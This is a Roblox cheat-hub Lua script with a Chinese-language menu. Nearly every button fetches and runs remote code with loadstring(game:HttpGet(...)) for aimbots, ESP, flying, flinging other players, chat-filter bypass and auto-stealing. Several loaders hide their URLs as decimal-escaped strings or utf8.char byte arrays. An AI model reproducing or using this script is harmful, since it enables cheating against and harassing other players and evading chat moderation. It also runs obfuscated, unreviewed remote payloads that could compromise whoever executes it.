local CoreGui = game:GetService("StarterGui")

CoreGui:SetCore("SendNotification", {
    Title = "你的脚本",
    Text = "正在加载jerk中心",
    Duration = 5, 
})
print("jerk帮你开启了反挂机")
		local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		   wait(1)
		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/asehbzi/gay/refs/heads/main/gay')))()
local Window = OrionLib:MakeWindow({Name = "jerk中心", HidePremium = false, SaveConfig = true,IntroText = "欢迎使用jerk中心", ConfigFolder = "欢迎使用jerk中心"})
local about = Window:MakeTab({
    Name = "信息",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

about:AddParagraph("您的用户名:"," "..game.Players.LocalPlayer.Name.."")
about:AddParagraph("您的注入器:"," "..identifyexecutor().."")
about:AddParagraph("您当前服务器的ID"," "..game.GameId.."")
about:AddParagraph("作者qq3828619907目前被封")
about:AddParagraph("作者qq2530844420目前未被封")
about:AddParagraph(" qq官方群692367787")
about:AddParagraph("作者B站名字→已经花18个币改名")
about:AddParagraph("作者快手zG5418800")
about:AddParagraph("免费脚本请不要倒卖")
about:AddParagraph("也不要外传")

local Tab = Window:MakeTab({
  Name = "通用脚本",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "飞行",
	Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/u8rthPGW"))()

end
})
Tab:AddButton({
	Name = "透视",
	Callback = function()

loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/UNIVERSALESPLTX/main/README.md'),true))()

end
})
Tab:AddButton({
	Name = "聊天绕过",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/Fechatbypassroblox/refs/heads/main/Fe%20Roblox%20ChatBypass"))()
	
end
})
Tab:AddButton({
	Name = "帽子旋转",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/Fe-Spinning-Hat-Script/refs/heads/main/Fe%20Spinning%20Hats%20Script"))()

end
})
Tab:AddButton({
	Name = "r15变r6",
	Callback = function()
	
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-on-R15-16865"))()

end
})
Tab:AddButton({
	Name = "选人甩飞（需要输入别人的名字）",
	Callback = function()
	
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Auto%20Fling%20Player'))()

end
})
Tab:AddButton({
	Name = "阿尔宙斯自瞄",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20Aimbot.lua"))()

end
})
Tab:AddButton({
	Name = "换皮肤（需要别人id还需要加入群组Hell_$treet）",
	Callback = function()
	
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\73\110\118\111\111\107\101\114\49\49\47\79\117\116\102\105\116\47\109\97\105\110\47\79\117\116\102\105\116\67\111\112\105\101\114\46\108\117\97\34\44\32\116\114\117\101\41\41\40\41\10")()

end

})
Tab:AddButton({
	Name = "键盘脚本",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()

end
})
Tab:AddButton({
	Name = "无限收益（copyid 输入别人名字获得id可搭配换皮肤使用）",
	Callback = function()
	
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()

end
})
Tab:AddButton({
	Name = "光影",
	Callback = function()
	
loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()

end
})
Tab:AddButton({
	Name = "无头加kor",
	Callback = function()
	
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Permanent-Headless-And-korblox-Script-4140"))()

end
})
Tab:AddButton({
	Name = "Shift Lock",
	Callback = function()
	
-- made by fedoratum.

-- Gui to Lua
-- Version: 3.2

-- Instances:

local ShiftlockStarterGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")

--Properties:

ShiftlockStarterGui.Name = "Shiftlock (StarterGui)"
ShiftlockStarterGui.Parent = game.CoreGui
ShiftlockStarterGui.ZIndexBehavior =  Enum.ZIndexBehavior.Sibling
ShiftlockStarterGui.ResetOnSpawn = false

ImageButton.Parent = ShiftlockStarterGui
ImageButton.Active = true
ImageButton.Draggable = true
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.BackgroundTransparency = 1.000
ImageButton.Position = UDim2.new(0.921914339, 0, 0.552375436, 0)
ImageButton.Size = UDim2.new(0.0636147112, 0, 0.0661305636, 0)
ImageButton.SizeConstraint = Enum.SizeConstraint.RelativeXX
ImageButton.Image = "http://www.roblox.com/asset/?id=182223762"

-- Scripts:

local function TLQOYN_fake_script() -- ImageButton.ShiftGUI 
	local script = Instance.new('LocalScript', ImageButton)

	local MobileCameraFramework = {}
	local players = game:GetService("Players")
	local runservice = game:GetService("RunService")
	local CAS = game:GetService("ContextActionService")
	local player = players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local root = character:WaitForChild("HumanoidRootPart")
	local humanoid = character.Humanoid
	local camera = workspace.CurrentCamera
	local button = script.Parent
	
	--Visiblity
	uis = game:GetService("UserInputService")
	ismobile = uis.TouchEnabled
	button.Visible = ismobile
	
	local states = {
		OFF = "rbxasset://textures/ui/mouseLock_off@2x.png",
		ON = "rbxasset://textures/ui/mouseLock_on@2x.png"
	}
	local MAX_LENGTH = 900000
	local active = false
	local ENABLED_OFFSET = CFrame.new(1.7, 0, 0)
	local DISABLED_OFFSET = CFrame.new(-1.7, 0, 0)
local rootPos = Vector3.new(0,0,0)
local function UpdatePos()
if player.Character and player.Character:FindFirstChildOfClass"Humanoid" and player.Character:FindFirstChildOfClass"Humanoid".RootPart then
rootPos = player.Character:FindFirstChildOfClass"Humanoid".RootPart.Position
end
end
	local function UpdateImage(STATE)
		button.Image = states[STATE]
	end
	local function UpdateAutoRotate(BOOL)
if player.Character and player.Character:FindFirstChildOfClass"Humanoid" then
player.Character:FindFirstChildOfClass"Humanoid".AutoRotate = BOOL
end
end
	local function GetUpdatedCameraCFrame()
if game:GetService"Workspace".CurrentCamera then
return CFrame.new(rootPos, Vector3.new(game:GetService"Workspace".CurrentCamera.CFrame.LookVector.X * MAX_LENGTH, rootPos.Y, game:GetService"Workspace".CurrentCamera.CFrame.LookVector.Z * MAX_LENGTH))
end
end
	local function EnableShiftlock()
UpdatePos()
		UpdateAutoRotate(false)
		UpdateImage("ON")
if player.Character and player.Character:FindFirstChildOfClass"Humanoid" and player.Character:FindFirstChildOfClass"Humanoid".RootPart then
player.Character:FindFirstChildOfClass"Humanoid".RootPart.CFrame = GetUpdatedCameraCFrame()
end
if game:GetService"Workspace".CurrentCamera then
game:GetService"Workspace".CurrentCamera.CFrame = camera.CFrame * ENABLED_OFFSET
end
	end
	local function DisableShiftlock()
UpdatePos()
		UpdateAutoRotate(true)
		UpdateImage("OFF")
		if game:GetService"Workspace".CurrentCamera then
game:GetService"Workspace".CurrentCamera.CFrame = camera.CFrame * DISABLED_OFFSET
end
		pcall(function()
			active:Disconnect()
			active = nil
		end)
	end
	UpdateImage("OFF")
	active = false
	function ShiftLock()
		if not active then
			active = runservice.RenderStepped:Connect(function()
				EnableShiftlock()
			end)
		else
			DisableShiftlock()
		end
	end
	local ShiftLockButton = CAS:BindAction("ShiftLOCK", ShiftLock, false, "On")
	CAS:SetPosition("ShiftLOCK", UDim2.new(0.8, 0, 0.8, 0))
	button.MouseButton1Click:Connect(function()
		if not active then
			active = runservice.RenderStepped:Connect(function()
				EnableShiftlock()
			end)
		else
			DisableShiftlock()
		end
	end)
	return MobileCameraFramework
	
end
coroutine.wrap(TLQOYN_fake_script)()
local function OMQRQRC_fake_script() -- ShiftlockStarterGui.LocalScript 
	local script = Instance.new('LocalScript', ShiftlockStarterGui)

	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	local Settings = UserSettings()
	local GameSettings = Settings.GameSettings
	local ShiftLockController = {}
	while not Players.LocalPlayer do
		wait()
	end
	local LocalPlayer = Players.LocalPlayer
	local Mouse = LocalPlayer:GetMouse()
	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
	local ScreenGui, ShiftLockIcon, InputCn
	local IsShiftLockMode = true
	local IsShiftLocked = true
	local IsActionBound = false
	local IsInFirstPerson = false
	ShiftLockController.OnShiftLockToggled = Instance.new("BindableEvent")
	local function isShiftLockMode()
		return LocalPlayer.DevEnableMouseLock and GameSettings.ControlMode == Enum.ControlMode.MouseLockSwitch and LocalPlayer.DevComputerMovementMode ~= Enum.DevComputerMovementMode.ClickToMove and GameSettings.ComputerMovementMode ~= Enum.ComputerMovementMode.ClickToMove and LocalPlayer.DevComputerMovementMode ~= Enum.DevComputerMovementMode.Scriptable
	end
	if not UserInputService.TouchEnabled then
		IsShiftLockMode = isShiftLockMode()
	end
	local function onShiftLockToggled()
		IsShiftLocked = not IsShiftLocked
		ShiftLockController.OnShiftLockToggled:Fire()
	end
	local initialize = function()
		print("enabled")
	end
	function ShiftLockController:IsShiftLocked()
		return IsShiftLockMode and IsShiftLocked
	end
	function ShiftLockController:SetIsInFirstPerson(isInFirstPerson)
		IsInFirstPerson = isInFirstPerson
	end
	local function mouseLockSwitchFunc(actionName, inputState, inputObject)
		if IsShiftLockMode then
			onShiftLockToggled()
		end
	end
	local function disableShiftLock()
		if ScreenGui then
			ScreenGui.Parent = nil
		end
		IsShiftLockMode = false
		Mouse.Icon = ""
		if InputCn then
			InputCn:disconnect()
			InputCn = nil
		end
		IsActionBound = false
		ShiftLockController.OnShiftLockToggled:Fire()
	end
	local onShiftInputBegan = function(inputObject, isProcessed)
		if isProcessed then
			return
		end
		if inputObject.UserInputType ~= Enum.UserInputType.Keyboard or inputObject.KeyCode == Enum.KeyCode.LeftShift or inputObject.KeyCode == Enum.KeyCode.RightShift then
		end
	end
	local function enableShiftLock()
		IsShiftLockMode = isShiftLockMode()
		if IsShiftLockMode then
			if ScreenGui then
				ScreenGui.Parent = PlayerGui
			end
			if IsShiftLocked then
				ShiftLockController.OnShiftLockToggled:Fire()
			end
			if not IsActionBound then
				InputCn = UserInputService.InputBegan:connect(onShiftInputBegan)
				IsActionBound = true
			end
		end
	end
	GameSettings.Changed:connect(function(property)
		if property == "ControlMode" then
			if GameSettings.ControlMode == Enum.ControlMode.MouseLockSwitch then
				enableShiftLock()
			else
				disableShiftLock()
			end
		elseif property == "ComputerMovementMode" then
			if GameSettings.ComputerMovementMode == Enum.ComputerMovementMode.ClickToMove then
				disableShiftLock()
			else
				enableShiftLock()
			end
		end
	end)
	LocalPlayer.Changed:connect(function(property)
		if property == "DevEnableMouseLock" then
			if LocalPlayer.DevEnableMouseLock then
				enableShiftLock()
			else
				disableShiftLock()
			end
		elseif property == "DevComputerMovementMode" then
			if LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.ClickToMove or LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.Scriptable then
				disableShiftLock()
			else
				enableShiftLock()
			end
		end
	end)
	LocalPlayer.CharacterAdded:connect(function(character)
		if not UserInputService.TouchEnabled then
			initialize()
		end
	end)
	if not UserInputService.TouchEnabled then
		initialize()
		if isShiftLockMode() then
			InputCn = UserInputService.InputBegan:connect(onShiftInputBegan)
			IsActionBound = true
		end
	end
	enableShiftLock()
	return ShiftLockController
	
end
coroutine.wrap(OMQRQRC_fake_script)()

end
})
Tab:AddButton({
	Name = "直接改服装",
	Callback = function()
	
loadstring(game:HttpGet("https://pastebin.com/raw/6X72Mdfs"))()

end
})
local Tab = Window:MakeTab({
  Name = "最强战场",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "刀锋",
	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/zyrask/Nexus-Base/main/atomic-blademaster%20to%20sukuna"))()

end
})
Tab:AddButton({
	Name = "五条悟",
	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/main/Latest.lua"))()

end

})
Tab:AddButton({
	Name = "饿狼自动1+2",
	Callback = function()
	
loadstring(game:HttpGet("https://pastefy.app/Z7DawZJB/raw"))()

end
})
Tab:AddButton({
	Name = "饿狼改索尼克",
	Callback = function()
	
loadstring(game:HttpGet("https://pastebin.com/raw/7V1mUBtQ"))()

end
})
Tab:AddButton({
	Name = "琦玉改JUN",
	Callback = function()
	
loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Tp%20exploit%20saitama%20to%20jun'))()

end
})
Tab:AddButton({
	Name = "死神v2",
	Callback = function()
	
getgenv().Music = false 
--Setting this to false usually fixes most executors
--also it helps load time a little bit
getgenv().AttackQuality = 'High'
--Set to Low,High

 getgenv().ConstantSpeed = false
--if you want your speed to be constant
loadstring(game:HttpGet("https://raw.githubusercontent.com/Reapvitalized/TSB/main/APOPHENIA.lua"))()

end
})
Tab:AddButton({
	Name = "饿狼不知道该叫什么V2",
	Callback = function()
	
getgenv().OptimizeUltimate = true
--self explanatory
getgenv().ReduceUltFlash = true
--self explanatory
getgenv().Move1Insta = false
--set it to false if you dont want the first move to instant kill
getgenv().LowQualityMode = true
--set to true if you have a shit pc (like me)
getgenv().BetaConsole = true
--its a console menu so you can modify each settings whenever you want
loadstring(game:HttpGet("https://raw.githubusercontent.com/Reapvitalized/TSB/refs/heads/main/ARCAURA.lua"))()

end
})
Tab:AddButton({
	Name = "索尼克改TOJI",
	Callback = function()
	
loadstring(game:HttpGet"https://raw.githubusercontent.com/Wi-sp/Limitless-legacy/refs/heads/main/GUI")()

end
})
Tab:AddButton({
	Name = "骨架",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/Qaiddanial2904/ROBLOX-FREAKY-GOJO-REAL/refs/heads/main/SANS%20%5BREDACTED%5D"))()

end
})
Tab:AddButton({
	Name = "饿狼改YUJI",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/xVicity/GLACIER/main/LATEST.lua"))()

end
})
Tab:AddButton({
	Name = "gojo2",
	Callback = function()
	
loadstring(game:HttpGet("https://pastebin.com/raw/zF6Rdky0"))()

end
})
Tab:AddButton({
	Name = "饿狼gojo",
	Callback = function()
	
loadstring(game:HttpGet("https://pastebin.com/raw/3Cz8kF8M",true))()

end
})
Tab:AddButton({
	Name = "VOLTRA",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/Reapvitalized/TSB/refs/heads/main/VOLTA.lua"))()

end
})
Tab:AddButton({
	Name = "饿狼改Shinjuku Yuji",
	Callback = function()
	
loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Yuji%20early%20access'))()

end
})
local Tab = Window:MakeTab({
  Name = "GB",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "星火交辉",
	Callback = function()
	
local SCC_CharPool={
[1]= tostring(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,51,55,116,67,82,116,117,109})end)()))}

loadstring(game:HttpGet(SCC_CharPool[1]))()
---内脏与黑火药清风(星火交辉版)

end
})
Tab:AddButton({
	Name = "老大版本",
	Callback = function()
	
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\115\109\115\109\100\109\115\109\115\107\47\87\107\115\107\115\111\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\69\87\79\74\79\34\41\41\40\41")()

end
})
local Tab = Window:MakeTab({
  Name = "别人的脚本",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
 Tab:AddButton({
	Name = "情云",
	Callback = function()
	
loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()

end
})
Tab:AddButton({
	Name = "落叶",
	Callback = function()
	
getgenv().LS="落叶中心" loadstring(game:HttpGet("https://raw.githubusercontent.com/krlpl/Deciduous-center-LS/main/%E8%90%BD%E5%8F%B6%E4%B8%AD%E5%BF%83%E6%B7%B7%E6%B7%86.txt"))()

end
})
Tab:AddButton({
	Name = "XK",
	Callback = function()
	
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\73\78\106\105\97\111\98\122\120\54\47\66\73\78\106\105\97\111\47\109\97\105\110\47\88\75\46\84\88\84\34\41\41\40\41\10")()

end
})
Tab:AddButton({
	Name = "皮",
	Callback = function()
	
getgenv().XiaoPi="皮脚本QQ群1002100032" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()
end
})
Tab:AddButton({
	Name = "导管",
	Callback = function()
	
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()

end
})

local Tab = Window:MakeTab({
  Name = "doors",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
  Tab:AddButton({
	Name = "MS",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/mspaint/main/main.lua"))()

end
})
Tab:AddButton({
	Name = "bob汉化",
	Callback = function()
	
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))()

end
})

Tab:AddButton({
	Name = "rooms&doors",
	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/Rooms%20%26%20Doors"))()

end
})
Tab:AddButton({
	Name = "rooms同人服务器",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/Rooms"))()

end
})
local Tab = Window:MakeTab({
  Name = "动感星期五",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "动感星期五1",
	Callback = function()
	
loadstring(game:HttpGet("https://rawscripts.net/raw/Funky-Friday-Fire-Hub-18850"))()

end
})
local Tab = Window:MakeTab({
  Name = "压力脚本",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
  Tab:AddButton({
	Name = "NB",
	Callback = function()
	
loadstring(game:HttpGet(('https://github.com/DocYogurt/Main/raw/main/Scripts/Pressure')))()

end
})
local Tab = Window:MakeTab({
  Name = "战争大亨",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
  Tab:AddButton({
	Name = "自动偷箱",
	Callback = function()
	
loadstring(game:HttpGet('https://raw.githubusercontent.com/Cazzanos/The-basement/main/Basement%20hub', true))()

end
})
local Tab = Window:MakeTab({
  Name = "da hood",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
  Tab:AddButton({
	Name = "不知名中心",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/main/FinallyV4"))()

end
})
Tab:AddButton({
	Name = "自瞄",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/yzeedw/Mortalv2-main/main/mortal.cc/ekittens/mc%20target%20v0.3"))()

end
})
local Tab = Window:MakeTab({
  Name = "Fish🐟",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "需要做卡密",
	Callback = function()
	
loadstring(game:HttpGet("https://bonkhubloader.netlify.app",true))()

end
})